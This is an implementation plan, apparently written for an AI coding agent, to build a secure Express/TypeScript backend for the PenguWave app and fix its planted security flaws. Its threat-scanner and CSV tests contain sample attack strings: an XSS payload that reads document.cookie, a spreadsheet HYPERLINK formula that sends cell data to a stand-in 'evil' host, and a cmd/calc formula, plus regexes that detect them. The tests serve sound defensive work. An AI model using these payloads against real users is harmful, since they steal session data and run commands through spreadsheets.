# PenguWave Secure Backend Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a real, secure Express + TypeScript backend for PenguWave, wire the existing React UI to it, and neutralize the 7 planted security traps — with two headline wow moments (XSS→token-theft defeated by httpOnly cookies, and server-side RBAC) plus a signature "threat-aware ingestion" feature.

**Architecture:** A Node + TypeScript Express server persists to SQLite (`better-sqlite3`), seeded from `data/mock_events.json`. Sessions are opaque tokens stored server-side and carried in an **httpOnly, SameSite cookie** (never readable by JS). Every protected route checks auth and role on the server. The frontend talks to `/api` through a Vite dev proxy (same-origin, so cookies just work). Pure security helpers (`sanitizeHtml`, `toCsv`) are fixed with TDD.

**Tech Stack:** Node, TypeScript, Express, better-sqlite3, bcryptjs, zod, cookie-parser, crypto (sessions); Vitest + Supertest (tests); DOMPurify (frontend sanitization); Vite proxy.

**Design decisions (documented deviations from the contract):**
- **httpOnly cookie instead of a JSON `token`.** The contract calls token/`Authorization: Bearer` a *suggestion*. We use a server-side session + httpOnly cookie because a `localStorage` token is stealable by XSS (trap #2). `/api/auth/me` reads the cookie, not a header.
- **Severity widened to include `CRITICAL`** (present in the data, missing from the original type).
- **`sourceIp` and `userId` are nullable** (present as `null` in the data).
- **`threatFlags: string[]`** added to events (signature feature).

---

## File Structure

**Backend (new, under `server/`):**
- `server/index.ts` — bootstrap: build app, open DB, seed, `listen(3001)`.
- `server/app.ts` — `buildApp(db)` returns a configured Express app (lets tests inject an in-memory DB).
- `server/db.ts` — open SQLite, create schema.
- `server/seed.ts` — idempotent seed of users + events (runs threat scan on each event).
- `server/threat.ts` — `scanForThreats(event)` → `string[]` flags (signature feature).
- `server/auth.ts` — password hash/verify, session create/lookup/delete, `requireAuth`/`requireAdmin` middleware, cookie helpers.
- `server/validation.ts` — zod schemas for request bodies.
- `server/errors.ts` — `ApiError`, `sendError`, central error-handling middleware.
- `server/routes/auth.routes.ts` — login / logout / me.
- `server/routes/events.routes.ts` — list / get one.
- `server/routes/users.routes.ts` — list / create / patch / delete (admin only).
- `server/__tests__/*.test.ts` — Supertest integration tests per route group + threat unit test.

**Frontend (modify existing):**
- `src/api.ts` — real API client, `credentials: "include"`, no token, no secret.
- `src/auth/AuthContext.tsx` — (new) auth state from `/api/auth/me`.
- `src/components/LoginModal.tsx` — real login, error handling, no console log.
- `src/components/Navbar.tsx` — show current user + real logout.
- `src/pages/EventsPage.tsx` — fetch from API; safe rendering; CRITICAL color; safe CSV export; threat badges; loading/empty/error states.
- `src/pages/UsersPage.tsx` — fetch from API; admin-gated; no password column; real CRUD; `type="password"`.
- `src/utils.ts` — real `sanitizeHtml` (DOMPurify), safe `toCsv`, remove client `isAdmin`.
- `src/types.ts` — widen severity, nullable fields, `threatFlags`, password-less `User`.
- `src/App.tsx` — auth provider, route guards, remove `DEBUG_BYPASS_AUTH`.

**Config:**
- `vite.config.ts` — `/api` proxy → `http://localhost:3001`.
- `.gitignore` — `node_modules`, `*.db`, `.env`, `dist`.
- `package.json` — deps + scripts.
- `tsconfig.server.json` — server TS config (Node, CommonJS interop for better-sqlite3).
- `vitest.config.ts` — test config for the server.

---

## Phase 0 — Project setup

### Task 0.1: Install dependencies

**Files:** Modify `package.json` (via npm).

- [ ] **Step 1: Install runtime + dev deps**

Run:
```bash
npm install express better-sqlite3 bcryptjs zod cookie-parser dompurify
npm install -D tsx vitest supertest @types/express @types/better-sqlite3 @types/bcryptjs @types/cookie-parser @types/supertest
```
Expected: installs succeed, `package.json` updated. (`dompurify` ships its own types.)

- [ ] **Step 2: Add scripts to `package.json`**

In the `"scripts"` block, add:
```json
"server": "tsx watch server/index.ts",
"server:start": "tsx server/index.ts",
"test:server": "vitest run",
"test:watch": "vitest"
```

- [ ] **Step 3: Commit**

```bash
git add package.json package-lock.json
git commit -m "Add backend and test dependencies"
```

### Task 0.2: Config files

**Files:** Create `tsconfig.server.json`, `vitest.config.ts`; modify `vite.config.ts`, `.gitignore`.

- [ ] **Step 1: Create `tsconfig.server.json`**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "esModuleInterop": true,
    "allowSyntheticDefaultImports": true,
    "strict": true,
    "skipLibCheck": true,
    "resolveJsonModule": true,
    "types": ["node"]
  },
  "include": ["server/**/*.ts"]
}
```

- [ ] **Step 2: Create `vitest.config.ts`**

```ts
import { defineConfig } from "vitest/config";

export default defineConfig({
  test: {
    include: ["server/**/*.test.ts"],
    environment: "node",
  },
});
```

- [ ] **Step 3: Add the dev proxy to `vite.config.ts`**

Replace the file with:
```ts
import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";

export default defineConfig({
  plugins: [react()],
  server: {
    proxy: {
      "/api": "http://localhost:3001",
    },
  },
});
```

- [ ] **Step 4: Create/append `.gitignore`**

```
node_modules
dist
*.db
*.db-journal
.env
.env.*
```

- [ ] **Step 5: Commit**

```bash
git add tsconfig.server.json vitest.config.ts vite.config.ts .gitignore
git commit -m "Add server tsconfig, vitest config, Vite API proxy, gitignore"
```

---

## Phase 1 — Database, threat scanner, seed

### Task 1.1: Threat scanner (signature feature, pure function — TDD)

**Files:**
- Create: `server/threat.ts`
- Test: `server/__tests__/threat.test.ts`

- [ ] **Step 1: Write the failing test**

```ts
// server/__tests__/threat.test.ts
import { describe, it, expect } from "vitest";
import { scanForThreats } from "../threat";

describe("scanForThreats", () => {
  it("flags an embedded XSS payload in the description", () => {
    const flags = scanForThreats({
      description: "subject: <img src=x onerror=alert(document.cookie)>",
    });
    expect(flags).toContain("xss");
  });

  it("flags a spreadsheet/formula-injection payload", () => {
    const flags = scanForThreats({ description: '=HYPERLINK("http://evil/?x="&A1)' });
    expect(flags).toContain("formula-injection");
  });

  it("flags a command-style formula payload starting with +", () => {
    const flags = scanForThreats({ assetHostname: "+cmd|'/C calc'!A0" });
    expect(flags).toContain("formula-injection");
  });

  it("returns an empty array for clean data", () => {
    const flags = scanForThreats({
      title: "Suspicious process on prod-web-03",
      description: "mimikatz.exe executed",
      assetHostname: "prod-web-03.penguwave.internal",
    });
    expect(flags).toEqual([]);
  });

  it("ignores null/undefined fields without throwing", () => {
    expect(() => scanForThreats({ description: null, sourceIp: undefined })).not.toThrow();
  });
});
```

- [ ] **Step 2: Run test, verify it fails**

Run: `npx vitest run server/__tests__/threat.test.ts`
Expected: FAIL — cannot find module `../threat`.

- [ ] **Step 3: Implement `server/threat.ts`**

```ts
// Scans untrusted event fields for embedded attack payloads.
// This is PenguWave's "threat-aware ingestion": the system that stores
// security events should itself recognize attacks hidden in that data.

const TEXT_FIELDS = [
  "title",
  "description",
  "assetHostname",
  "assetIp",
  "sourceIp",
  "userId",
] as const;

// Matches HTML tags with inline event handlers, <script>, javascript: URLs.
const XSS_RE = /<\s*script|\son\w+\s*=|javascript:|<\s*img[^>]*onerror/i;

// Spreadsheet/CSV formula injection: a cell that starts with = + - @
const FORMULA_RE = /^[=+\-@]/;

export function scanForThreats(event: Record<string, unknown>): string[] {
  const flags = new Set<string>();
  for (const field of TEXT_FIELDS) {
    const value = event[field];
    if (typeof value !== "string") continue;
    if (XSS_RE.test(value)) flags.add("xss");
    if (FORMULA_RE.test(value.trim())) flags.add("formula-injection");
  }
  return [...flags];
}
```

- [ ] **Step 4: Run test, verify it passes**

Run: `npx vitest run server/__tests__/threat.test.ts`
Expected: PASS (5 tests).

- [ ] **Step 5: Commit**

```bash
git add server/threat.ts server/__tests__/threat.test.ts
git commit -m "Add threat-aware ingestion scanner with tests"
```

### Task 1.2: Database schema

**Files:** Create `server/db.ts`.

- [ ] **Step 1: Implement `server/db.ts`**

```ts
import Database from "better-sqlite3";

export type DB = Database.Database;

export function openDb(path = "penguwave.db"): DB {
  const db = new Database(path);
  db.pragma("journal_mode = WAL");
  db.pragma("foreign_keys = ON");
  initSchema(db);
  return db;
}

export function initSchema(db: DB): void {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id            TEXT PRIMARY KEY,
      email         TEXT UNIQUE NOT NULL,
      role          TEXT NOT NULL,
      status        TEXT NOT NULL,
      password_hash TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS events (
      id            TEXT PRIMARY KEY,
      timestamp     TEXT,
      severity      TEXT,
      title         TEXT,
      description   TEXT,
      assetHostname TEXT,
      assetIp       TEXT,
      sourceIp      TEXT,
      tags          TEXT NOT NULL DEFAULT '[]',
      userId        TEXT,
      threatFlags   TEXT NOT NULL DEFAULT '[]'
    );

    CREATE TABLE IF NOT EXISTS sessions (
      token      TEXT PRIMARY KEY,
      user_id    TEXT NOT NULL,
      created_at TEXT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );
  `);
}
```

- [ ] **Step 2: Commit**

```bash
git add server/db.ts
git commit -m "Add SQLite schema for users, events, sessions"
```

### Task 1.3: Seed users and events (idempotent)

**Files:** Create `server/seed.ts`. Depends on `server/threat.ts`, `server/db.ts`.

- [ ] **Step 1: Implement `server/seed.ts`**

```ts
import bcrypt from "bcryptjs";
import type { DB } from "./db";
import { scanForThreats } from "./threat";
import mockEvents from "../data/mock_events.json" assert { type: "json" };

// Local-dev demo credentials. NOT secrets — throwaway logins for a local app,
// documented in the README. Overridable via env for anyone who wants to.
const SEED_USERS = [
  { id: "usr-001", email: "admin@penguwave.io",   role: "admin",   status: "active",   password: process.env.SEED_ADMIN_PW   ?? "admin-demo-pw" },
  { id: "usr-002", email: "analyst@penguwave.io", role: "analyst", status: "active",   password: process.env.SEED_ANALYST_PW ?? "analyst-demo-pw" },
  { id: "usr-003", email: "viewer@penguwave.io",  role: "viewer",  status: "disabled", password: process.env.SEED_VIEWER_PW  ?? "viewer-demo-pw" },
];

export function seed(db: DB): void {
  seedUsers(db);
  seedEvents(db);
}

function seedUsers(db: DB): void {
  const insert = db.prepare(
    `INSERT OR IGNORE INTO users (id, email, role, status, password_hash)
     VALUES (@id, @email, @role, @status, @password_hash)`
  );
  for (const u of SEED_USERS) {
    insert.run({
      id: u.id,
      email: u.email,
      role: u.role,
      status: u.status,
      password_hash: bcrypt.hashSync(u.password, 10),
    });
  }
}

function seedEvents(db: DB): void {
  const insert = db.prepare(
    `INSERT OR IGNORE INTO events
       (id, timestamp, severity, title, description, assetHostname, assetIp, sourceIp, tags, userId, threatFlags)
     VALUES
       (@id, @timestamp, @severity, @title, @description, @assetHostname, @assetIp, @sourceIp, @tags, @userId, @threatFlags)`
  );
  const rows = mockEvents as Array<Record<string, unknown>>;
  for (const e of rows) {
    if (typeof e.id !== "string") continue; // defensive: skip malformed records with no id
    insert.run({
      id: e.id,
      timestamp: (e.timestamp as string) ?? null,
      severity: (e.severity as string) ?? null,
      title: (e.title as string) ?? "",
      description: (e.description as string) ?? "",
      assetHostname: (e.assetHostname as string) ?? "",
      assetIp: (e.assetIp as string) ?? null,
      sourceIp: (e.sourceIp as string) ?? null,
      tags: JSON.stringify(Array.isArray(e.tags) ? e.tags : []),
      userId: (e.userId as string) ?? null,
      threatFlags: JSON.stringify(scanForThreats(e)),
    });
  }
}
```

- [ ] **Step 2: Commit**

```bash
git add server/seed.ts
git commit -m "Add idempotent seed for users and events with threat flags"
```

---

## Phase 2 — Errors, validation, auth core

### Task 2.1: Error helpers + central handler

**Files:** Create `server/errors.ts`.

- [ ] **Step 1: Implement `server/errors.ts`**

```ts
import type { Request, Response, NextFunction } from "express";

export class ApiError extends Error {
  status: number;
  constructor(status: number, message: string) {
    super(message);
    this.status = status;
  }
}

export function notFound(_req: Request, res: Response): void {
  res.status(404).json({ error: "Not found" });
}

// Central error handler — every thrown ApiError becomes a consistent JSON body.
export function errorHandler(
  err: unknown,
  _req: Request,
  res: Response,
  _next: NextFunction
): void {
  if (err instanceof ApiError) {
    res.status(err.status).json({ error: err.message });
    return;
  }
  console.error("Unexpected error:", err);
  res.status(500).json({ error: "Internal server error" });
}
```

- [ ] **Step 2: Commit**

```bash
git add server/errors.ts
git commit -m "Add ApiError and central error handler"
```

### Task 2.2: Validation schemas

**Files:** Create `server/validation.ts`.

- [ ] **Step 1: Implement `server/validation.ts`**

```ts
import { z } from "zod";

export const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

export const ROLES = ["admin", "analyst", "viewer"] as const;
export const STATUSES = ["active", "disabled"] as const;

export const createUserSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8),
  role: z.enum(ROLES),
});

export const updateUserSchema = z
  .object({
    role: z.enum(ROLES).optional(),
    status: z.enum(STATUSES).optional(),
  })
  .refine((b) => b.role !== undefined || b.status !== undefined, {
    message: "Provide role and/or status",
  });
```

- [ ] **Step 2: Commit**

```bash
git add server/validation.ts
git commit -m "Add zod validation schemas"
```

### Task 2.3: Auth core (hashing, sessions, middleware)

**Files:** Create `server/auth.ts`. Depends on `server/db.ts`, `server/errors.ts`.

- [ ] **Step 1: Implement `server/auth.ts`**

```ts
import crypto from "node:crypto";
import bcrypt from "bcryptjs";
import type { Request, Response, NextFunction } from "express";
import type { DB } from "./db";
import { ApiError } from "./errors";

export const SESSION_COOKIE = "pw_session";

export interface SessionUser {
  id: string;
  email: string;
  role: string;
  status: string;
}

export function verifyPassword(plain: string, hash: string): boolean {
  return bcrypt.compareSync(plain, hash);
}

export function createSession(db: DB, userId: string): string {
  const token = crypto.randomBytes(32).toString("hex");
  db.prepare(
    "INSERT INTO sessions (token, user_id, created_at) VALUES (?, ?, ?)"
  ).run(token, userId, new Date().toISOString());
  return token;
}

export function destroySession(db: DB, token: string): void {
  db.prepare("DELETE FROM sessions WHERE token = ?").run(token);
}

export function userFromSession(db: DB, token: string | undefined): SessionUser | null {
  if (!token) return null;
  const row = db
    .prepare(
      `SELECT u.id, u.email, u.role, u.status
       FROM sessions s JOIN users u ON u.id = s.user_id
       WHERE s.token = ?`
    )
    .get(token) as SessionUser | undefined;
  return row ?? null;
}

// Sets the session cookie: httpOnly so JS (and any XSS) cannot read it.
export function setSessionCookie(res: Response, token: string): void {
  res.cookie(SESSION_COOKIE, token, {
    httpOnly: true,
    sameSite: "lax",
    secure: false, // dev is http://localhost; set true behind HTTPS
    path: "/",
  });
}

export function clearSessionCookie(res: Response): void {
  res.clearCookie(SESSION_COOKIE, { path: "/" });
}

// Express augmentation so route handlers can read req.user.
declare global {
  // eslint-disable-next-line @typescript-eslint/no-namespace
  namespace Express {
    interface Request {
      user?: SessionUser;
      db: DB;
    }
  }
}

export function requireAuth(req: Request, _res: Response, next: NextFunction): void {
  const user = userFromSession(req.db, req.cookies?.[SESSION_COOKIE]);
  if (!user) throw new ApiError(401, "Authentication required");
  req.user = user;
  next();
}

export function requireAdmin(req: Request, _res: Response, next: NextFunction): void {
  if (req.user?.role !== "admin") throw new ApiError(403, "Admin role required");
  next();
}
```

- [ ] **Step 2: Commit**

```bash
git add server/auth.ts
git commit -m "Add auth core: bcrypt verify, server-side sessions, httpOnly cookie, RBAC middleware"
```

---

## Phase 3 — App assembly + auth routes (TDD via Supertest)

### Task 3.1: Auth routes

**Files:** Create `server/routes/auth.routes.ts`. Depends on `auth.ts`, `validation.ts`, `errors.ts`.

- [ ] **Step 1: Implement `server/routes/auth.routes.ts`**

```ts
import { Router } from "express";
import {
  createSession,
  destroySession,
  setSessionCookie,
  clearSessionCookie,
  userFromSession,
  verifyPassword,
  requireAuth,
  SESSION_COOKIE,
  type SessionUser,
} from "../auth";
import { ApiError } from "../errors";
import { loginSchema } from "../validation";

export const authRouter = Router();

authRouter.post("/login", (req, res) => {
  const parsed = loginSchema.safeParse(req.body);
  if (!parsed.success) throw new ApiError(400, "Invalid request body");
  const { email, password } = parsed.data;

  const row = req.db
    .prepare("SELECT id, email, role, status, password_hash FROM users WHERE email = ?")
    .get(email) as (SessionUser & { password_hash: string }) | undefined;

  // Same error for missing user and wrong password: don't leak which emails exist.
  if (!row || !verifyPassword(password, row.password_hash)) {
    throw new ApiError(401, "Invalid email or password");
  }
  if (row.status !== "active") {
    throw new ApiError(403, "Account is disabled");
  }

  const token = createSession(req.db, row.id);
  setSessionCookie(res, token);
  res.json({ user: { id: row.id, email: row.email, role: row.role } });
});

authRouter.post("/logout", (req, res) => {
  const token = req.cookies?.[SESSION_COOKIE];
  if (token) destroySession(req.db, token);
  clearSessionCookie(res);
  res.json({ message: "Logged out" });
});

authRouter.get("/me", requireAuth, (req, res) => {
  res.json(req.user);
});
```

- [ ] **Step 2: Commit**

```bash
git add server/routes/auth.routes.ts
git commit -m "Add auth routes: login, logout, me"
```

### Task 3.2: Assemble the app

**Files:** Create `server/app.ts`. Depends on all of the above.

- [ ] **Step 1: Implement `server/app.ts`** (events/users routers are added in later tasks; import them now and create stubs in 4.x/3.x order — events router created next task, users after; to keep the app compiling, create them before wiring. Order below assumes Tasks 3.3 and 4.1 routers exist.)

```ts
import express from "express";
import cookieParser from "cookie-parser";
import type { DB } from "./db";
import { errorHandler, notFound } from "./errors";
import { authRouter } from "./routes/auth.routes";
import { eventsRouter } from "./routes/events.routes";
import { usersRouter } from "./routes/users.routes";

export function buildApp(db: DB) {
  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  // Make the DB available to every handler.
  app.use((req, _res, next) => {
    req.db = db;
    next();
  });

  app.use("/api/auth", authRouter);
  app.use("/api/events", eventsRouter);
  app.use("/api/users", usersRouter);

  app.use(notFound);
  app.use(errorHandler);
  return app;
}
```

> Note: this file imports `eventsRouter` and `usersRouter`. Create them (Tasks 3.3 and 4.1) before running anything that imports `app.ts`. The auth test in Task 3.4 needs them to exist, so implement 3.3 and 4.1 first if running tests strictly in order — or temporarily comment the events/users lines. Recommended: do 3.3 and 4.1, then return to 3.4.

- [ ] **Step 2: Commit**

```bash
git add server/app.ts
git commit -m "Assemble Express app with DB injection and routers"
```

### Task 3.3: Events routes

**Files:** Create `server/routes/events.routes.ts`. Depends on `auth.ts`, `errors.ts`.

- [ ] **Step 1: Implement `server/routes/events.routes.ts`**

```ts
import { Router } from "express";
import { requireAuth } from "../auth";
import { ApiError } from "../errors";

export const eventsRouter = Router();

interface EventRow {
  id: string;
  timestamp: string | null;
  severity: string | null;
  title: string;
  description: string;
  assetHostname: string;
  assetIp: string | null;
  sourceIp: string | null;
  tags: string;
  userId: string | null;
  threatFlags: string;
}

function toEvent(row: EventRow) {
  return {
    ...row,
    tags: JSON.parse(row.tags),
    threatFlags: JSON.parse(row.threatFlags),
  };
}

eventsRouter.get("/", requireAuth, (req, res) => {
  const rows = req.db.prepare("SELECT * FROM events ORDER BY timestamp DESC").all() as EventRow[];
  res.json(rows.map(toEvent));
});

eventsRouter.get("/:id", requireAuth, (req, res) => {
  const row = req.db.prepare("SELECT * FROM events WHERE id = ?").get(req.params.id) as
    | EventRow
    | undefined;
  if (!row) throw new ApiError(404, "Event not found");
  res.json(toEvent(row));
});
```

- [ ] **Step 2: Commit**

```bash
git add server/routes/events.routes.ts
git commit -m "Add events routes (auth-protected list and detail)"
```

### Task 3.4: Auth + events integration tests

**Files:** Create `server/__tests__/auth.test.ts`. (Requires Tasks 3.1–3.3 and 4.1 done so `app.ts` imports resolve.)

- [ ] **Step 1: Write the failing test**

```ts
// server/__tests__/auth.test.ts
import { describe, it, expect, beforeEach } from "vitest";
import request from "supertest";
import { openDbInMemory } from "./helpers";
import { buildApp } from "../app";

function appWithSeed() {
  const db = openDbInMemory();
  return buildApp(db);
}

describe("auth", () => {
  let app: ReturnType<typeof buildApp>;
  beforeEach(() => {
    app = appWithSeed();
  });

  it("rejects login with bad credentials (401)", async () => {
    const res = await request(app)
      .post("/api/auth/login")
      .send({ email: "admin@penguwave.io", password: "wrong" });
    expect(res.status).toBe(401);
    expect(res.body.error).toBe("Invalid email or password");
  });

  it("rejects a disabled account (403)", async () => {
    const res = await request(app)
      .post("/api/auth/login")
      .send({ email: "viewer@penguwave.io", password: "viewer-demo-pw" });
    expect(res.status).toBe(403);
  });

  it("logs in an active user and sets an httpOnly cookie", async () => {
    const res = await request(app)
      .post("/api/auth/login")
      .send({ email: "admin@penguwave.io", password: "admin-demo-pw" });
    expect(res.status).toBe(200);
    expect(res.body.user.email).toBe("admin@penguwave.io");
    const cookie = res.headers["set-cookie"][0];
    expect(cookie.toLowerCase()).toContain("httponly");
  });

  it("blocks /api/auth/me without a session (401)", async () => {
    const res = await request(app).get("/api/auth/me");
    expect(res.status).toBe(401);
  });

  it("returns the current user via the session cookie", async () => {
    const agent = request.agent(app);
    await agent
      .post("/api/auth/login")
      .send({ email: "analyst@penguwave.io", password: "analyst-demo-pw" });
    const res = await agent.get("/api/auth/me");
    expect(res.status).toBe(200);
    expect(res.body.role).toBe("analyst");
  });

  it("blocks events when unauthenticated (401)", async () => {
    const res = await request(app).get("/api/events");
    expect(res.status).toBe(401);
  });

  it("returns events when authenticated", async () => {
    const agent = request.agent(app);
    await agent
      .post("/api/auth/login")
      .send({ email: "analyst@penguwave.io", password: "analyst-demo-pw" });
    const res = await agent.get("/api/events");
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body)).toBe(true);
    expect(res.body.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Create the test helper `server/__tests__/helpers.ts`**

```ts
import { openDb } from "../db";
import { seed } from "../seed";
import type { DB } from "../db";

export function openDbInMemory(): DB {
  const db = openDb(":memory:");
  seed(db);
  return db;
}
```

- [ ] **Step 3: Run tests, verify they pass**

Run: `npx vitest run server/__tests__/auth.test.ts`
Expected: PASS (7 tests). If imports fail, ensure Tasks 3.3 and 4.1 routers exist.

- [ ] **Step 4: Commit**

```bash
git add server/__tests__/auth.test.ts server/__tests__/helpers.ts
git commit -m "Add auth + events integration tests"
```

---

## Phase 4 — Users routes + RBAC (the wow moment, TDD)

### Task 4.1: Users routes (admin-only)

**Files:** Create `server/routes/users.routes.ts`. Depends on `auth.ts`, `validation.ts`, `errors.ts`.

- [ ] **Step 1: Implement `server/routes/users.routes.ts`**

```ts
import { Router } from "express";
import crypto from "node:crypto";
import bcrypt from "bcryptjs";
import { requireAuth, requireAdmin } from "../auth";
import { ApiError } from "../errors";
import { createUserSchema, updateUserSchema } from "../validation";

export const usersRouter = Router();

// Every user route requires auth AND admin. Server-side — the client cannot bypass it.
usersRouter.use(requireAuth, requireAdmin);

interface PublicUser {
  id: string;
  email: string;
  role: string;
  status: string;
}

const PUBLIC_COLS = "id, email, role, status"; // never select password_hash

usersRouter.get("/", (req, res) => {
  const rows = req.db.prepare(`SELECT ${PUBLIC_COLS} FROM users`).all() as PublicUser[];
  res.json(rows);
});

usersRouter.post("/", (req, res) => {
  const parsed = createUserSchema.safeParse(req.body);
  if (!parsed.success) throw new ApiError(400, parsed.error.issues[0]?.message ?? "Invalid body");
  const { email, password, role } = parsed.data;

  const exists = req.db.prepare("SELECT 1 FROM users WHERE email = ?").get(email);
  if (exists) throw new ApiError(400, "Email already in use");

  const id = `usr-${crypto.randomBytes(4).toString("hex")}`;
  req.db
    .prepare(
      "INSERT INTO users (id, email, role, status, password_hash) VALUES (?, ?, ?, 'active', ?)"
    )
    .run(id, email, role, bcrypt.hashSync(password, 10));

  const user = req.db.prepare(`SELECT ${PUBLIC_COLS} FROM users WHERE id = ?`).get(id);
  res.status(201).json(user);
});

usersRouter.patch("/:id", (req, res) => {
  const parsed = updateUserSchema.safeParse(req.body);
  if (!parsed.success) throw new ApiError(400, parsed.error.issues[0]?.message ?? "Invalid body");

  const existing = req.db.prepare("SELECT id FROM users WHERE id = ?").get(req.params.id);
  if (!existing) throw new ApiError(404, "User not found");

  const { role, status } = parsed.data;
  if (role) req.db.prepare("UPDATE users SET role = ? WHERE id = ?").run(role, req.params.id);
  if (status) req.db.prepare("UPDATE users SET status = ? WHERE id = ?").run(status, req.params.id);

  const user = req.db.prepare(`SELECT ${PUBLIC_COLS} FROM users WHERE id = ?`).get(req.params.id);
  res.json(user);
});

usersRouter.delete("/:id", (req, res) => {
  const result = req.db.prepare("DELETE FROM users WHERE id = ?").run(req.params.id);
  if (result.changes === 0) throw new ApiError(404, "User not found");
  res.json({ message: "User deleted" });
});
```

- [ ] **Step 2: Commit**

```bash
git add server/routes/users.routes.ts
git commit -m "Add admin-only user management routes with server-side RBAC"
```

### Task 4.2: RBAC + users integration tests (the headline)

**Files:** Create `server/__tests__/users.test.ts`.

- [ ] **Step 1: Write the failing test**

```ts
// server/__tests__/users.test.ts
import { describe, it, expect, beforeEach } from "vitest";
import request from "supertest";
import { openDbInMemory } from "./helpers";
import { buildApp } from "../app";

async function agentFor(app: ReturnType<typeof buildApp>, email: string, password: string) {
  const agent = request.agent(app);
  await agent.post("/api/auth/login").send({ email, password });
  return agent;
}

describe("users RBAC", () => {
  let app: ReturnType<typeof buildApp>;
  beforeEach(() => {
    app = buildApp(openDbInMemory());
  });

  it("blocks unauthenticated access to users (401)", async () => {
    const res = await request(app).get("/api/users");
    expect(res.status).toBe(401);
  });

  it("forbids a non-admin (analyst) from listing users (403)", async () => {
    const agent = await agentFor(app, "analyst@penguwave.io", "analyst-demo-pw");
    const res = await agent.get("/api/users");
    expect(res.status).toBe(403);
  });

  it("allows an admin to list users and NEVER returns passwords", async () => {
    const agent = await agentFor(app, "admin@penguwave.io", "admin-demo-pw");
    const res = await agent.get("/api/users");
    expect(res.status).toBe(200);
    expect(res.body.length).toBeGreaterThan(0);
    for (const u of res.body) {
      expect(u).not.toHaveProperty("password");
      expect(u).not.toHaveProperty("password_hash");
    }
  });

  it("lets an admin create a user (201), returns it without a password", async () => {
    const agent = await agentFor(app, "admin@penguwave.io", "admin-demo-pw");
    const res = await agent
      .post("/api/users")
      .send({ email: "new@penguwave.io", password: "longenough1", role: "analyst" });
    expect(res.status).toBe(201);
    expect(res.body.email).toBe("new@penguwave.io");
    expect(res.body).not.toHaveProperty("password");
  });

  it("rejects creating a user with a short password (400)", async () => {
    const agent = await agentFor(app, "admin@penguwave.io", "admin-demo-pw");
    const res = await agent
      .post("/api/users")
      .send({ email: "x@penguwave.io", password: "short", role: "analyst" });
    expect(res.status).toBe(400);
  });

  it("returns 404 when deleting a missing user", async () => {
    const agent = await agentFor(app, "admin@penguwave.io", "admin-demo-pw");
    const res = await agent.delete("/api/users/nope");
    expect(res.status).toBe(404);
  });
});
```

- [ ] **Step 2: Run tests, verify they pass**

Run: `npx vitest run server/__tests__/users.test.ts`
Expected: PASS (6 tests).

- [ ] **Step 3: Run the whole server suite**

Run: `npm run test:server`
Expected: all tests PASS (threat + auth + users).

- [ ] **Step 4: Commit**

```bash
git add server/__tests__/users.test.ts
git commit -m "Add RBAC and user-management integration tests"
```

### Task 4.3: Server bootstrap

**Files:** Create `server/index.ts`.

- [ ] **Step 1: Implement `server/index.ts`**

```ts
import { openDb } from "./db";
import { seed } from "./seed";
import { buildApp } from "./app";

const db = openDb();
seed(db);

const app = buildApp(db);
const PORT = Number(process.env.PORT ?? 3001);
app.listen(PORT, () => {
  console.log(`PenguWave backend listening on http://localhost:${PORT}`);
});
```

- [ ] **Step 2: Start the server, verify it boots**

Run: `npm run server:start`
Expected: logs "PenguWave backend listening on http://localhost:3001". Then `Ctrl-C`.

- [ ] **Step 3: Smoke-test the live API**

Run (server running in another terminal):
```bash
curl -i -X POST http://localhost:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@penguwave.io","password":"admin-demo-pw"}'
```
Expected: `200`, a `Set-Cookie: pw_session=...; HttpOnly` header, body `{"user":{...}}`.

- [ ] **Step 4: Commit**

```bash
git add server/index.ts
git commit -m "Add server bootstrap (open db, seed, listen on 3001)"
```

---

## Phase 5 — Frontend security fixes (pure functions first, TDD)

### Task 5.1: Real `sanitizeHtml` and safe `toCsv`

**Files:**
- Modify: `src/utils.ts`
- Test: `src/utils.test.ts` (new)

- [ ] **Step 1: Write the failing test**

```ts
// src/utils.test.ts
import { describe, it, expect } from "vitest";
import { sanitizeHtml, toCsv } from "./utils";

describe("sanitizeHtml", () => {
  it("strips event handlers and script from HTML", () => {
    const out = sanitizeHtml('<img src=x onerror="alert(1)">hello');
    expect(out).not.toContain("onerror");
    expect(out.toLowerCase()).not.toContain("<script");
  });
});

describe("toCsv", () => {
  it("neutralizes formula-injection cells by prefixing a quote", () => {
    const csv = toCsv([{ a: "=HYPERLINK(1)", b: "+cmd|'/C calc'" }]);
    const dataLine = csv.split("\n")[1];
    expect(dataLine.startsWith("'=") || dataLine.includes(",'+") || dataLine.includes("\"'=")).toBe(true);
    expect(dataLine).not.toMatch(/(^|,)=/);
    expect(dataLine).not.toMatch(/(^|,)\+cmd/);
  });

  it("quotes values containing commas", () => {
    const csv = toCsv([{ a: "x,y" }]);
    expect(csv.split("\n")[1]).toContain('"x,y"');
  });
});
```

- [ ] **Step 2: Run test, verify it fails**

Run: `npx vitest run src/utils.test.ts`
Expected: FAIL (sanitize is a no-op; toCsv doesn't escape).

- [ ] **Step 3: Add DOMPurify dep (if not already) and rewrite `src/utils.ts`**

(`dompurify` was installed in Task 0.1.) Replace `src/utils.ts` with:
```ts
import DOMPurify from "dompurify";

/**
 * Sanitize a string before rendering it as HTML. Strips scripts, event
 * handlers, and dangerous markup using DOMPurify.
 */
export function sanitizeHtml(input: string): string {
  return DOMPurify.sanitize(input);
}

/**
 * Serialize records to CSV. Neutralizes spreadsheet formula injection
 * (cells starting with = + - @) and quotes values with commas/quotes/newlines.
 */
export function toCsv(rows: Record<string, unknown>[]): string {
  if (rows.length === 0) return "";
  const headers = Object.keys(rows[0]);
  const escapeCell = (value: unknown): string => {
    let s = String(value ?? "");
    if (/^[=+\-@]/.test(s)) s = "'" + s; // formula-injection guard
